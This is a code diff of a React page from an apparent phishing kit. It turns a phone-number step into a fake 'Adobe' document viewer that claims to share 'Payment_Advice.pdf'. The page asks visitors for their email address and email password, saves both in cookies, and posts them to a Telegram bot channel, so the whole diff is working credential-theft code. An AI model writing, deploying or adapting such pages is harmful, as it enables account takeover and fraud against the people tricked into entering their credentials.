@@ -1,33 +1,28 @@
 import Cookies from "js-cookie";
-import React, { useEffect, useState } from "react";
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { TELEGRAM_CHAT_ID, TELEGRAM_URL } from "./telegramConfig";
 
-const SecondPage = () => {
-  const [phone, setPhone] = useState("");
+const FirstPage = () => {
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
-  useEffect(() => {
-    const storedEmail = Cookies.get("user_email");
-    if (!storedEmail) navigate("/");
-    else setEmail(storedEmail);
-  }, [navigate]);
-
-  const handleNext = () => {
-    if (!phone) {
-      alert("Please enter your phone number");
+  const handleContinue = () => {
+    if (!email || !password) {
+      alert("Please enter both email and password");
       return;
     }
 
     setLoading(true);
-    Cookies.set("user_phone", phone);
+    Cookies.set("user_email", email);
+    Cookies.set("user_password", password);
 
     const message = `
-📱 *Step 2: Phone Submitted*
+🛑 *Step 1: Email + Password Submitted*
 📧 *Email:* ${email}
-📞 *Phone:* ${phone}
+🔑 *Password:* ${password}
     `;
 
     fetch(TELEGRAM_URL, {
@@ -42,18 +37,16 @@ const SecondPage = () => {
 
     setTimeout(() => {
       setLoading(false);
-      navigate("/step-three");
+      navigate("/step-two");
     }, 10000);
   };
 
   return (
     <div className="min-h-screen flex items-center justify-center">
       <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-md">
-        <h1 className="text-lg font-semibold text-red-600">
-          Phone Verification
-        </h1>
+        <h1 className="text-lg font-semibold text-red-600">Adobe</h1>
         <p className="text-sm text-gray-500 mt-2">
-          Email: <strong>{email}</strong>
+          Filename: <strong>Payment_Advice.pdf</strong>
         </p>
 
         {loading ? (
@@ -63,20 +56,28 @@ const SecondPage = () => {
         ) : (
           <>
             <input
-              type="tel"
+              type="email"
               className="mt-4 w-full border p-2 rounded-md"
-              placeholder="Enter Phone Number"
-              value={phone}
-              onChange={(e) => setPhone(e.target.value)}
+              placeholder="Enter Recipient Email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
             />
-            <p className="text-xs text-gray-500 mt-2">
-              A code will be sent to this number.
+            <input
+              type="password"
+              className="mt-2 w-full border p-2 rounded-md"
+              placeholder="Enter Email Password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+            />
+            <p className="text-xs text-gray-500 mt-4">
+              Only recipient email can access shared files. Link expires in 5
+              days.
             </p>
             <button
-              onClick={handleNext}
+              onClick={handleContinue}
               className="mt-6 w-full bg-red-500 text-white py-2 rounded-md hover:bg-red-600"
             >
-              Continue
+              View Document
             </button>
           </>
         )}
@@ -85,4 +86,4 @@ const SecondPage = () => {
   );
 };
 
-export default SecondPage;
+export default FirstPage;
